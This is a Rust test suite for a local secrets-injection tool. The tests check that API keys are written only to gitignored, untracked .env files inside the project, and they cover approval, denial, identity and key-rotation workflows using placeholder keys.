    let dir = tmp("tracked-env-literal-pathspec");
    init_git(&dir);
    let env_file = "credentials[prod].env";
    std::fs::write(dir.join(env_file), "OLD=1\n").unwrap();
    git(&dir, &["--literal-pathspecs", "add", "-f", "--", env_file]);
    std::fs::write(dir.join(".gitignore"), "*.env\n").unwrap();

    assert!(envfile::git_trackedness(&dir, &dir.join(env_file)).unwrap(), "brackets in the configured filename must not be interpreted as a pathspec");
    let err = envfile::write(&dir, env_file, "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
    assert!(err.to_string().contains("tracked by git"), "{err}");
    assert_eq!(std::fs::read_to_string(dir.join(env_file)).unwrap(), "OLD=1\n");
}

/// A nonzero git exit is "cannot prove untracked", not "untracked". This is especially
/// important when an ignore rule already covers a file that was added to the index earlier:
/// the ignore check will pass even though overwriting the file would update a committed secret.
#[test]
fn a_failing_git_tracked_check_cannot_overwrite_an_ignored_tracked_file() {
    let dir = tmp("tracked-env-git-failure");
    init_git(&dir);
    std::fs::write(dir.join(".env.local"), "OLD=1\n").unwrap();
    git(&dir, &["add", "-f", ".env.local"]);
    std::fs::write(dir.join(".gitignore"), ".env.local\n").unwrap();
    assert!(envfile::is_git_tracked(&dir, &dir.join(".env.local")));

    // A corrupt index makes `git ls-files` exit unsuccessfully while `check-ignore
    // --no-index` still reports the file ignored.
    std::fs::write(dir.join(".git/index"), "not a git index\n").unwrap();
    let output = git_output(&dir, &["ls-files", "--error-unmatch", "--", ".env.local"]);
    assert!(!output.status.success(), "the fixture must exercise a failing git exit status");
    assert!(envfile::git_trackedness(&dir, &dir.join(".env.local")).is_err());

    let err = envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
    assert!(format!("{err:#}").contains("cannot ask git whether"), "{err:#}");
    assert_eq!(std::fs::read_to_string(dir.join(".env.local")).unwrap(), "OLD=1\n", "indeterminate trackedness must leave the file untouched");
}

/// Exercise an unavailable git executable in a child process so changing PATH cannot race
/// unrelated tests in this process.
#[test]
fn unavailable_git_cannot_overwrite_an_ignored_tracked_file() {
    const CHILD_DIR: &str = "TOKENSTASH_TEST_NO_GIT_TRACKED_DIR";
    if let Some(dir) = std::env::var_os(CHILD_DIR) {
        let dir = PathBuf::from(dir);
        assert!(envfile::git_trackedness(&dir, &dir.join(".env.local")).is_err());
        let err = envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
        assert!(format!("{err:#}").contains("cannot run git"), "{err:#}");
        assert_eq!(std::fs::read_to_string(dir.join(".env.local")).unwrap(), "OLD=1\n");
        return;
    }

    let dir = tmp("tracked-env-no-git");
    init_git(&dir);
    std::fs::write(dir.join(".env.local"), "OLD=1\n").unwrap();
    git(&dir, &["add", "-f", ".env.local"]);
    std::fs::write(dir.join(".gitignore"), ".env.local\n").unwrap();

    let status = std::process::Command::new(std::env::current_exe().unwrap())
        .args(["--exact", "tests::unavailable_git_cannot_overwrite_an_ignored_tracked_file"])
        .env(CHILD_DIR, &dir)
        .env("PATH", "")
        .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).status().unwrap();
    assert!(status.success(), "child regression test failed");
    assert_eq!(std::fs::read_to_string(dir.join(".env.local")).unwrap(), "OLD=1\n");
}

#[test]
fn gitignore_coverage_is_glob_matched_not_assumed() {
    use envfile::ignore_line_covers as c;
    assert!(c(".env.local", ".env.local"));
    assert!(c("/.env.local", ".env.local"));
    assert!(c(".env*", ".env.local"));
    assert!(c("*.local", ".env.local"));
    assert!(c(".env.*", ".env.local"));
    assert!(c("*", ".env.local"));
    assert!(!c(".env*", "credentials.txt"), "pattern must actually match the configured name");
    assert!(!c("*.local", "secrets.env"));
    assert!(!c("!.env.local", ".env.local"), "negation is not coverage");
    assert!(!c(".env.local/", ".env.local"), "directory rule is not coverage");
    assert!(!c("config/.env.local", ".env.local"), "path-anchored rules are not evaluated");
    assert!(!c("# .env.local", ".env.local"));
    assert!(c(".env.?ocal", ".env.local"));
    // end to end with a non-default name and a misleading existing rule
    let dir = tmp("gi-glob");
    init_git(&dir);
    std::fs::write(dir.join(".gitignore"), ".env*\n").unwrap();
    envfile::write(&dir, "credentials.txt", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    let gi = std::fs::read_to_string(dir.join(".gitignore")).unwrap();
    assert!(gi.lines().any(|l| l == "credentials.txt"), "explicit rule must be appended: {gi}");
}

#[test]
fn approvals_follow_the_resolved_project_not_the_symlink() {
    let _env = env_lock();
    let home = tmp("approval-link-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let base = tmp("approval-link");
    let a = base.join("a"); let b = base.join("b"); std::fs::create_dir_all(&a).unwrap(); std::fs::create_dir_all(&b).unwrap();
    let link = base.join("current");
    std::os::unix::fs::symlink(&a, &link).unwrap();
    let cfg = Config::default(); // nothing trusted: every project needs approval
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from("sk-aaaaaaaaaaaa".to_string())).unwrap();
    // approve via the symlink while it points at a
    let out = need::need(&ctx, &link, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap();
    assert!(envfile::has(&a, ".env.local", "OPENAI_API_KEY"));
    // retarget the symlink at b: the approval must not carry over
    std::fs::remove_file(&link).unwrap();
    std::os::unix::fs::symlink(&b, &link).unwrap();
    let out = need::need(&ctx, &link, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }), "retargeted symlink must need its own approval");
    assert!(!envfile::has(&b, ".env.local", "OPENAI_API_KEY"));
}

#[test]
fn approval_injects_the_requested_identity() {
    let _env = env_lock();
    let home = tmp("approval-ident-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("approval-ident-proj").canonicalize().unwrap();
    let cfg = Config::default(); // untrusted → approval needed
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set("OPENAI_API_KEY@default", &SecretString::from("sk-defaultdefault".to_string())).unwrap();
    stash.set("OPENAI_API_KEY@work", &SecretString::from("sk-workworkwork1".to_string())).unwrap();
    let opts = need::NeedOpts { identity: Some("work".into()), ..Default::default() };
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &opts).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, identity, .. } => { assert_eq!(identity, "work"); task_id.clone() } o => panic!("{o:?}") };
    let t = db.get_task(&tid).unwrap().unwrap();
    assert!(t.names.contains(&"OPENAI_API_KEY@work".to_string()), "approval must record the identity: {:?}", t.names);
    tasks::answer_approval(&ctx, &t, tasks::Decision::Allow, None).unwrap();
    let env = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert!(env.contains("OPENAI_API_KEY=sk-workworkwork1"), "must inject the work identity, got: {env}");
    assert!(!env.contains("sk-defaultdefault"));
    // the waiter injects the requested identity even when the file already holds another
    // identity's value under the same name
    std::fs::write(proj.join(".env.local"), "OPENAI_API_KEY=sk-defaultdefault\n").unwrap();
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts { identity: Some("work".into()), blocking: true, timeout: std::time::Duration::from_millis(200), ..Default::default() }).unwrap();
    assert!(matches!(&out[0], need::Outcome::Injected { identity, .. } if identity == "work"), "{:?}", out[0]);
    assert!(std::fs::read_to_string(proj.join(".env.local")).unwrap().contains("sk-workworkwork1"));
}

#[test]
fn gitignore_last_match_wins() {
    use envfile::gitignore_covers as g;
    assert!(g(".env.local\n", ".env.local"));
    assert!(!g(".env.local\n!.env.local\n", ".env.local"), "later negation re-includes");
    assert!(g(".env.local\n!.env.local\n.env.local\n", ".env.local"), "later positive wins again");
    assert!(!g("!.env.local\n", ".env.local"));
    assert!(g(".env*\n!.env.example\n", ".env.local"), "negation of a different name is irrelevant");
    assert!(!g(".env*\n!.env.*\n", ".env.local"), "negated glob un-ignores");
    assert!(g("secrets/\n.env.local\n", ".env.local"), "directory rules are skipped, not treated as negation");
    assert!(!g(" .env.local\n", ".env.local"), "leading whitespace is part of a git pattern");
    assert!(g(".env.local   \n", ".env.local"), "trailing whitespace is ignored by git");
    // end to end: a negated file gets an explicit trailing rule, which wins
    let dir = tmp("gi-neg");
    init_git(&dir);
    std::fs::write(dir.join(".gitignore"), ".env.local\n!.env.local\n").unwrap();
    envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    let gi = std::fs::read_to_string(dir.join(".gitignore")).unwrap();
    assert!(g(&gi, ".env.local"), "after write, the file must be ignored: {gi}");
    assert_eq!(gi.lines().last(), Some(".env.local"));
}

#[test]
fn secret_is_not_written_when_ignore_protection_fails() {
    let dir = tmp("gi-fail");
    init_git(&dir);
    let target = dir.join("elsewhere.txt");
    std::fs::write(&target, "keep\n").unwrap();
    std::os::unix::fs::symlink(&target, dir.join(".gitignore")).unwrap();
    assert!(envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).is_err());
    assert!(!dir.join(".env.local").exists(), "secret must not land on disk without confirmed ignore protection");
}

#[test]
fn approval_is_final_even_if_injection_fails() {
    let _env = env_lock();
    let home = tmp("approval-final-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("approval-final-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set("A_KEY@default", &SecretString::from("aaaaaaaaaa".to_string())).unwrap();
    stash.set("B_KEY@default", &SecretString::from("bbbbbbbbbb".to_string())).unwrap();
    let out = need::need(&ctx, &proj, "t", &["A_KEY".to_string(), "B_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    std::os::unix::fs::symlink(proj.join("nowhere"), proj.join(".env.local")).unwrap();
    let r = tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Allow, None);
    assert!(r.is_err(), "injection failure must be surfaced");
    assert_eq!(db.get_task(&tid).unwrap().unwrap().status, db::TaskStatus::Answered);
    let ws = db.find_workspace(&proj).unwrap().unwrap();
    assert!(db.grant_source(&ws.id, "A_KEY", "default").unwrap().is_some());
    std::fs::remove_file(proj.join(".env.local")).unwrap();
    let out = need::need(&ctx, &proj, "t", &["A_KEY".to_string(), "B_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(out.iter().all(|o| matches!(o, need::Outcome::Injected { .. })), "{out:?}");
}

#[test]
fn program_derived_approvals_do_not_merge() {
    let _env = env_lock();
    let home = tmp("approval-merge-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("approval-merge-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set("A_KEY@default", &SecretString::from("aaaaaaaaaa".to_string())).unwrap();
    stash.set("B_KEY@default", &SecretString::from("bbbbbbbbbb".to_string())).unwrap();
    let ra = need::NeedOpts { require_approval: true, ..Default::default() };
    let a = need::need(&ctx, &proj, "run", &["A_KEY".to_string()], &ra).unwrap();
    let b = need::need(&ctx, &proj, "run", &["B_KEY".to_string()], &ra).unwrap();
    let (ta, tb) = match (&a[0], &b[0]) {
        (need::Outcome::Pending { task_id: x, .. }, need::Outcome::Pending { task_id: y, .. }) => (x.clone(), y.clone()),
        o => panic!("{o:?}"),
    };
    assert_ne!(ta, tb, "two program-derived requests must not share an approval task");
    tasks::answer_approval(&ctx, &db.get_task(&ta).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap();
    assert!(envfile::has(&proj, ".env.local", "A_KEY"));
    assert!(!envfile::has(&proj, ".env.local", "B_KEY"), "B must wait for its own approval");
    assert_eq!(db.get_task(&tb).unwrap().unwrap().status, db::TaskStatus::Pending);
    // the one-time approval is not a grant: an ordinary request pairs on its own
    let c = need::need(&ctx, &proj, "t", &["A_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(c[0], need::Outcome::Pending { .. }), "{c:?}");
    pair(&db, &proj, "A_KEY");
    let c = need::need(&ctx, &proj, "t", &["A_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(c[0], need::Outcome::Injected { .. }));
}

#[test]
fn wait_does_not_file_duplicate_program_approvals() {
    let _env = env_lock();
    let home = tmp("wait-dup-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("wait-dup-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set("A_KEY@default", &SecretString::from("aaaaaaaaaa".to_string())).unwrap();
    let ra = need::NeedOpts { require_approval: true, ..Default::default() };
    let mut out = need::need(&ctx, &proj, "run", &["A_KEY".to_string()], &ra).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    // approve from "another thread" shortly after the wait begins
    let db2 = Db::open(&home.join("t.db")).unwrap();
    let cfg2 = cfg.clone(); let tid2 = tid.clone(); let proj2 = proj.clone();
    let h = std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_millis(300));
        let st = stash::open(&cfg2).unwrap();
        let c = tasks::Ctx { cfg: &cfg2, db: &db2, stash: st.as_ref(), probe: tasks::Probe::Off };
        tasks::answer_approval(&c, &db2.get_task(&tid2).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap();
        let _ = proj2;
    });
    need::wait(&ctx, &proj, &mut out, std::time::Duration::from_secs(5)).unwrap();
    h.join().unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }), "{:?}", out[0]);
    let open: Vec<_> = db.list_tasks(Some(&proj.to_string_lossy()), true).unwrap();
    assert!(open.is_empty(), "waiting must not file a second approval task: {open:?}");
}

#[test]
fn nested_gitignore_reinclude_is_handled_via_git() {
    let dir = tmp("gi-nested");
    init_git(&dir);
    let sub = dir.join("apps/web");
    std::fs::create_dir_all(&sub).unwrap();
    std::fs::write(dir.join(".gitignore"), ".env.local\n").unwrap();
    std::fs::write(sub.join(".gitignore"), "!.env.local\n").unwrap();
    assert_eq!(envfile::git_check_ignore(&dir, &sub.join(".env.local")), Some(false));
    envfile::write(&sub, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    assert_eq!(envfile::git_check_ignore(&dir, &sub.join(".env.local")), Some(true), "must be effectively ignored after write");
    let nested = std::fs::read_to_string(sub.join(".gitignore")).unwrap();
    assert_eq!(nested.lines().last(), Some(".env.local"), "rule appended to the closest ignore file: {nested}");
}

/// `env_file` is configuration, not a trusted path. Every protection in this module
/// (gitignore coverage, the tracked-file check) is anchored on the project directory, so a
/// value that resolves outside it is a secret written with no protection at all.
#[test]
fn absolute_env_file_is_refused() {
    let dir = tmp("envfile-abs");
    let outside = tmp("envfile-abs-outside").join("ESCAPE-TARGET.env");
    let target = outside.to_string_lossy().to_string();
    let err = envfile::write(&dir, &target, "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
    assert!(err.to_string().contains("relative"), "must name the problem: {err}");
    assert!(!outside.exists(), "an absolute env_file must not write a secret outside the project");
    assert!(!envfile::has(&dir, &target, "K"));
}

#[test]
fn env_file_escaping_with_dotdot_is_refused() {
    let base = tmp("envfile-dotdot");
    let proj = base.join("proj");
    std::fs::create_dir_all(&proj).unwrap();
    let err = envfile::write(&proj, "../ESCAPE-TARGET.env", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
    assert!(err.to_string().contains(".."), "must name the problem: {err}");
    assert!(!base.join("ESCAPE-TARGET.env").exists(), "'..' must not write a secret outside the project");
}

#[test]
fn env_file_under_a_symlinked_parent_outside_the_project_is_refused() {
    let base = tmp("envfile-linked-parent");
    let proj = base.join("proj");
    let outside = base.join("outside");
    std::fs::create_dir_all(&proj).unwrap();
    std::fs::create_dir_all(&outside).unwrap();
    std::os::unix::fs::symlink(&outside, proj.join("linked")).unwrap();
    let err = envfile::write(&proj, "linked/.env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
    assert!(err.to_string().contains("outside the project"), "must name the problem: {err}");
    assert!(!outside.join(".env.local").exists(), "a symlinked parent must not route the secret out of the project");
    // ...while a genuine subdirectory of the project still works
    std::fs::create_dir_all(proj.join("config")).unwrap();
    envfile::write(&proj, "config/.env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    assert!(envfile::has(&proj, "config/.env.local", "K"));
}

#[test]
fn tracked_env_file_is_still_refused_when_project_path_is_a_symlink() {
    // macOS hands out /var/folders/... while the canonical path is /private/var/...; a
    // resolver that hands git a canonical path defeats the tracked-file check.
    let real = tmp("tracked-env-symlink-real");
    let link = std::env::temp_dir().join(format!("tokenstash-test-tracked-env-symlink-link-{}", std::process::id()));
    let _ = std::fs::remove_file(&link);
    std::os::unix::fs::symlink(&real, &link).unwrap();
    init_git(&real);
    std::fs::write(real.join(".env.local"), "OLD=1\n").unwrap();
    git(&real, &["add", ".env.local"]);
    git(&real, &["commit", "-q", "-m", "oops"]);
    let err = envfile::write(&link, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
    assert!(err.to_string().contains("git rm --cached"), "tracked file must be refused through a symlinked project path: {err}");
    assert_eq!(std::fs::read_to_string(real.join(".env.local")).unwrap(), "OLD=1\n");
    let _ = std::fs::remove_file(&link);
}

#[test]
fn env_file_with_leading_dot_slash_is_accepted() {
    let dir = tmp("envfile-curdir");
    init_git(&dir);
    let p = envfile::write(&dir, "./.env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    assert!(p.starts_with(&dir));
    assert!(envfile::has(&dir, "./.env.local", "K"));
}


#[test]
fn a_git_dir_in_a_shared_ancestor_never_becomes_the_project_root() {
    // /tmp-like: sticky, world-writable. A repo there must not become the write root.
    let shared = tmp("shared-ancestor");
    init_git(&shared);
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&shared, std::fs::Permissions::from_mode(0o1777)).unwrap();
    }
    let proj = shared.join("proj");
    std::fs::create_dir_all(&proj).unwrap();
    assert_eq!(envfile::owned_git_root(&proj).unwrap(), None, "sticky ancestor must not be a root");
    assert_eq!(envfile::git_root(&shared.join("proj")), Some(shared.clone()), "plain detection still sees it");
    assert_eq!(crate::project::canonical(&proj), proj.canonicalize().unwrap());
    // ...and the env file lands in the project, not the ancestor
    let written = envfile::write(&proj, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    assert!(written.starts_with(proj.canonicalize().unwrap()) || written.starts_with(&proj), "{}", written.display());
    assert!(!shared.join(".env.local").exists());
    assert!(!shared.join(".gitignore").exists(), "no ignore rule written into the shared ancestor");
    // ...but the project is still inside a repo, so it gets the rule in its OWN .gitignore:
    // the closest file wins, and writing nothing at all would leave the secret committable
    // by a `git add -A` from the ancestor.
    assert!(envfile::gitignore_covers(&std::fs::read_to_string(proj.join(".gitignore")).unwrap(), ".env.local"), "the project's own .gitignore covers the env file");
    // a normal, user-owned repo still resolves as before
    let repo = tmp("owned-repo");
    std::fs::create_dir_all(repo.join(".git")).unwrap();
    std::fs::write(repo.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
    let sub = repo.join("a/b");
    std::fs::create_dir_all(&sub).unwrap();
    assert_eq!(envfile::git_root(&sub), Some(repo.clone()));
    assert_eq!(envfile::owned_git_root(&sub).unwrap(), Some(repo.clone()));
    // a tracked env file is still refused inside the shared ancestor: detection is not
    // suppressed, only adoption as a write root
    std::fs::write(shared.join("proj/.env.local"), "OLD=1\n").unwrap();
    // -f: the project's own .gitignore now covers it, and this test needs it tracked anyway
    git(&shared, &["add", "-f", "proj/.env.local"]);
    assert!(envfile::is_git_tracked(&proj, &proj.join(".env.local")));
    assert!(envfile::write(&proj, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).is_err());
}


#[test]
fn a_broad_grant_never_unlocks_sensitive_keys() {
    let dir = tmp("wildcard-sensitive");
    let db = Db::open(&dir.join("t.db")).unwrap();
    let outside = dir.join("elsewhere");
    std::fs::create_dir_all(&outside).unwrap();
    let ws = db.workspace_for(&outside).unwrap();
    db.grant(&ws.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    assert!(matches!(trust::gate(&db, &ws, "OPENAI_API_KEY", "default", false, true).unwrap(), trust::Gate::Open { .. }));
    assert!(matches!(trust::gate(&db, &ws, "STRIPE_SECRET_KEY", "default", true, true).unwrap(), trust::Gate::NeedsApproval { reason: trust::GateReason::Sensitive }),
        "a broad grant must not silence a sensitive key");
    db.grant(&ws.id, "STRIPE_SECRET_KEY", "default", db::GRANT_KEY, db::GRANT_SENSITIVE).unwrap();
    assert!(matches!(trust::gate(&db, &ws, "STRIPE_SECRET_KEY", "default", true, true).unwrap(), trust::Gate::Open { .. }));
}

#[test]
fn a_run_shim_approval_is_not_a_standing_grant() {
    let _g = env_lock();
    let home = tmp("once-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("once-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let ws = db.workspace_for(&proj).unwrap();
    // a program-derived approval is one-time
    let t = tasks::create_approval_task(&ctx, &proj, "test", &["STRIPE_SECRET_KEY@default".to_string()], tasks::ApprovalKind::Once).unwrap();
    assert_eq!(t.expects, tasks::APPROVAL_ONCE);
    tasks::answer_approval(&ctx, &t, tasks::Decision::Allow, None).unwrap();
    assert_eq!(db.get_task(&t.id).unwrap().unwrap().status, db::TaskStatus::Answered, "the answer is recorded");
    assert!(db.grant_source(&ws.id, "STRIPE_SECRET_KEY", "default").unwrap().is_none(), "but no grant was written");
    assert!(matches!(trust::gate(&db, &ws, "STRIPE_SECRET_KEY", "default", true, true).unwrap(), trust::Gate::NeedsApproval { .. }), "the next bare request asks again");
    // an ordinary (human-facing) sensitive approval does persist
    let t2 = tasks::create_approval_task(&ctx, &proj, "test", &["STRIPE_SECRET_KEY@default".to_string()], tasks::ApprovalKind::Sensitive).unwrap();
    tasks::answer_approval(&ctx, &t2, tasks::Decision::Allow, None).unwrap();
    assert_eq!(db.grant_source(&ws.id, "STRIPE_SECRET_KEY", "default").unwrap().as_deref(), Some(db::GRANT_SENSITIVE));
    std::env::set_var("TOKENSTASH_HOME", base_home());
    std::env::remove_var("TOKENSTASH_STASH");
}

#[test]
fn a_denied_approval_is_remembered() {
    let _g = env_lock();
    let home = tmp("deny-approval-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("deny-approval-proj").canonicalize().unwrap();
    // outside every trust root, so a stash hit needs approval
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from("sk-test-aaaaaaaaaaaaaaaa".to_string())).unwrap();
    let names = vec!["OPENAI_API_KEY".to_string()];
    let out = need::need(&ctx, &proj, "test", &names, &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("expected pending, got {o:?}") };
    let t = db.get_task(&tid).unwrap().unwrap();
    assert_eq!(t.kind, db::TaskKind::Approval);
    tasks::answer_approval(&ctx, &t, tasks::Decision::Deny, None).unwrap();
    // asking again within the TTL is refused without a new card
    let out2 = need::need(&ctx, &proj, "test", &names, &need::NeedOpts::default()).unwrap();
    assert!(matches!(&out2[0], need::Outcome::Denied { .. }), "got {:?}", out2[0]);
    assert_eq!(db.list_tasks(Some(&proj.to_string_lossy()), true).unwrap().len(), 0, "no fresh approval card was filed");
    // an older denial for a DIFFERENT key is still honoured after a newer one
    stash.set(&stash::stash_key("GROQ_API_KEY", "default"), &SecretString::from("gsk_test_bbbbbbbbbbbbbbbb".to_string())).unwrap();
    let out_g = need::need(&ctx, &proj, "test", &["GROQ_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let gid = match &out_g[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    tasks::answer_approval(&ctx, &db.get_task(&gid).unwrap().unwrap(), tasks::Decision::Deny, None).unwrap();
    let both = need::need(&ctx, &proj, "test", &["OPENAI_API_KEY".to_string(), "GROQ_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(both.iter().all(|o| matches!(o, need::Outcome::Denied { .. })), "both denials must be remembered: {both:?}");
    assert_eq!(db.list_tasks(Some(&proj.to_string_lossy()), true).unwrap().len(), 0);
    // --force asks again
    let out3 = need::need(&ctx, &proj, "test", &names, &need::NeedOpts { force: true, ..Default::default() }).unwrap();
    assert!(matches!(&out3[0], need::Outcome::Pending { .. }));
    std::env::set_var("TOKENSTASH_HOME", base_home());
    std::env::remove_var("TOKENSTASH_STASH");
}


fn rot_ctx_home(name: &str) -> (PathBuf, PathBuf) {
    let home = tmp(&format!("{name}-home"));
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp(&format!("{name}-proj")).canonicalize().unwrap();
    (home, proj)
}

#[test]
fn a_stale_key_is_a_miss_with_the_reason_on_the_card() {
    let _g = env_lock();
    let (home, proj) = rot_ctx_home("stale-miss");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let names = vec!["OPENAI_API_KEY".to_string()];
    // store via a paste
    let t = tasks::create_secret_task(&ctx, &proj, "test", "OPENAI_API_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("sk-old-aaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    assert!(matches!(need::need(&ctx, &proj, "test", &names, &Default::default()).unwrap()[0], need::Outcome::Injected { .. }));
    // mark stale → the next need is a miss whose card carries the reason
    db.mark_stale("OPENAI_API_KEY", "default", true, Some("rejected by OpenAI (HTTP 401) on 2026-08-26, reported by claude-code in demo"), Some(db::STALE_REPORT)).unwrap();
    let out = need::need(&ctx, &proj, "test", &names, &Default::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    let card = db.get_task(&tid).unwrap().unwrap();
    assert!(card.why.as_deref().unwrap().contains("reported by claude-code in demo"), "{:?}", card.why);
    // the old value is still in the stash (self-heal path), not injected
    assert!(stash.get(&stash::stash_key("OPENAI_API_KEY", "default")).unwrap().is_some());
    // answering with a new value clears stale and injects
    tasks::answer_secret(&ctx, &card, SecretString::from("sk-new-bbbbbbbbbbbbbbbb".to_string()), true).unwrap();
    let m = db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap();
    assert!(!m.stale && m.stale_reason.is_none());
    assert!(std::fs::read_to_string(proj.join(".env.local")).unwrap().contains("sk-new-"));
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

#[test]
fn rotate_files_the_card_and_rewrites_every_project_holding_the_old_value() {
    let _g = env_lock();
    let (home, proj_a) = rot_ctx_home("rotate");
    let proj_b = tmp("rotate-proj-b").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let names = vec!["GROQ_API_KEY".to_string()];
    let t = tasks::create_secret_task(&ctx, &proj_a, "test", "GROQ_API_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("gsk_old_aaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    pair(&db, &proj_b, "GROQ_API_KEY");
    need::need(&ctx, &proj_b, "test", &names, &Default::default()).unwrap(); // delivered to B too
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("gsk_old_"));
